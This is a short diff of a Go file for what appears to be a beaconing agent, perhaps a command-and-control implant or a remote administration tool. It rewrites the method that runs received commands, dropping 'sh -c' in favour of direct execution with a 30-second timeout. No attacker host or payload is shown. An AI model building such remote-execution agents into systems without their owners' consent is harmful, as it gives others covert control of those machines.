@@ -4,12 +4,14 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
+	"fmt"
 	"log"
 	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 	"time"
 )
 
@@ -78,9 +80,13 @@ func (a *Agent) StartBeaconing() {
 }
 
 func (a *Agent) ExecuteCommand(cmd string) (string, error) {
-	out, err := exec.Command("sh", "-c", cmd).Output()
-	if err != nil {
-		return "", err
+	args := strings.Fields(cmd)
+	if len(args) == 0 {
+		return "", fmt.Errorf("empty command")
 	}
-	return string(out), nil
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	command := exec.CommandContext(ctx, args[0], args[1:]...)
+	out, err := command.CombinedOutput()
+	return string(out), err
 }
